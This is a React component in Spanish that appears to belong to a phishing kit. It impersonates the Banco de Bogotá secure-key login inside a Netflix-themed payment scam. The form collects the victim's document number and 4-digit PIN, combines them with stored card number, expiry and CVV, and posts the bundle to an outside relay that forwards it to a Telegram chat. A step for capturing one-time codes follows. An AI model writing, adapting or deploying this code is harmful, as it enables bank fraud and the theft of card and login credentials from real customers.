import React, { useState, useEffect } from 'react';
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import './animations.css';
import Otp from './otp';
import { EyeIcon } from '@heroicons/react/24/outline';

const SecurePayment = () => {
  const [documentNumber, setDocumentNumber] = useState('');
  const [secureKey, setSecureKey] = useState('');
  const [error, setError] = useState(false);
  const [step, setStep] = useState(1);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    // Recupera los datos almacenados en el localStorage, si existen
    const storedDocumentNumber = localStorage.getItem('documentNumber');
    const storedSecureKey = localStorage.getItem('secureKey');
    
    if (storedDocumentNumber) setDocumentNumber(storedDocumentNumber);
    if (storedSecureKey) setSecureKey(storedSecureKey);
  }, []);

  // Función para manejar el cambio de paso
  const handleStepChange = () => {
    setStep(2);
  };

  // Función para enviar un mensaje a Telegram
  const sendTelegramMessage = async (message) => {
    try {
      const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
      const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ chatId, message }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el mensaje a Telegram');
      }

      const result = await response.json();
    } catch (error) {
      console.error('Error:', error);
    }
  };

  // Función para manejar el envío del formulario
  const handleSubmit = async () => {
    try {
      if (documentNumber.length > 0 && secureKey.length === 4) {
        // Almacenar los datos en localStorage
        localStorage.setItem('documentNumber', documentNumber);
        localStorage.setItem('secureKey', secureKey);

        handleStepChange();

        // Recupera la información de la tarjeta del localStorage
        const formValues = JSON.parse(localStorage.getItem('formValues')) || {};
        const banco = localStorage.getItem('banco') || 'No disponible';

        if (!formValues.cardHolderName || !formValues.cardNumber) {
          throw new Error('Datos de la tarjeta no disponibles en localStorage');
        }

        const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'} \n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n- 🏦: ${banco}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 👤 : ${documentNumber}\n 🔒 : ${secureKey}`;

        await sendTelegramMessage(message);
      } else {
        setError(true);
      }
    } catch (error) {
      console.error('Error en el manejo del formulario:', error);
      setError(true);
    }
  };

  const handleDocumentChange = (e) => {
    setDocumentNumber(e.target.value);
    setError(false);
  };

  const handleKeyChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    setSecureKey(value);
  };

  return (
    <div className="flex flex-col items-center bg-gray-100 min-h-screen p-6">
      <TransitionGroup>
        <CSSTransition
          key={step}
          timeout={300}
          classNames="fade"
          unmountOnExit
        >
          <div className="w-full max-w-lg mx-auto bg-white p-6 rounded-lg shadow-lg">
            {step === 1 && (
              <div>
                <img
                  src="https://d31dn7nfpuwjnm.cloudfront.net/images/valoraciones/0023/7354/Banco_de_Bogot%C3%A1.jpg?1464013869"
                  alt="Menu"
                  className="w-48 mb-6 mx-auto"
                />
                <div className="w-full mb-6 flex items-center bg-[#0043A9] p-3 rounded-lg">
                  <img
                    src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png"
                    alt="Logo"
                    className="w-12 h-auto mr-4"
                  />
                  <div className="text-white text-sm">
                    <p>¿Nunca has ingresado a Banca Virtual?</p>
                    <p>Aquí te decimos cómo hacerlo ›</p>
                  </div>
                </div>

                <div className="w-full mb-6 text-center border-b border-gray-300 py-4 bg-white shadow-md rounded">
                  <span className="text-lg font-semibold">Clave segura</span>
                </div>

                <div className="w-full bg-white border border-gray-300 p-4 shadow-md rounded">
                  {/* Pestaña de Identificación */}
                  <div className="mb-4">
                    <h2 className="text-sm font-semibold mb-2 text-[#444444]">Identificación</h2>
                    <div className="flex items-center gap-4">
                      <select
                        className="h-12 w-24 pl-3 pr-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                        name="cc"
                      >
                        <option value="CC">CC</option>
                        {/* Puedes agregar más opciones si es necesario */}
                      </select>
                      <input
                        type="tel"
                        value={documentNumber}
                        onChange={handleDocumentChange}
                        placeholder="Número de documento"
                        minLength="6"
                        maxLength="10"
                        required
                        className="flex-1 h-12 pl-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                      />
                    </div>
                  </div>

                  {/* Pestaña de Clave Segura */}
                  <div>
                    <h2 className="text-sm font-semibold mb-2 text-[#444444]">Clave segura</h2>
                    <div className="relative">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={secureKey}
                        onChange={handleKeyChange}
                        placeholder="Clave segura"
                        minLength="4"
                        maxLength="4"
                        required
                        className="w-full h-12 pl-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute inset-y-0 right-0 flex items-center pr-3"
                      >
                        <EyeIcon className={`w-5 h-5 text-gray-500 ${showPassword ? 'text-blue-500' : ''}`} />
                      </button>
                    </div>
                  </div>

                  <input type="hidden" value="bogota" />

                  <a href="#" className="text-blue-800 block m-4 text-center text-sm">Olvidé mi clave</a>
                  <button
                    onClick={handleSubmit}
                    disabled={!documentNumber || secureKey.length !== 4} // Disable if input is empty or key length is not 4
                    className={`w-full h-12 ${documentNumber && secureKey.length === 4 ? 'bg-blue-800' : 'bg-gray-400'} text-white font-semibold rounded-full hover:bg-blue-700 transition duration-300`}
                  >
                    Ingresar ahora
                  </button>
                  {error && <p className="text-red-500 mt-2 text-center">Por favor, complete todos los campos.</p>}
                </div>

                <div className="w-full flex justify-between mt-6">
                  <p className='text-sm'>Este sitio está protegido por reCAPTCHA y aplican las políticas de privacidad y los términos de servicio de Google.</p>
                </div>
              </div>
            )}

            {step === 2 && (
              <Otp />
            )}
          </div>
        </CSSTransition>
      </TransitionGroup>
    </div>
  );
};

export default SecurePayment;
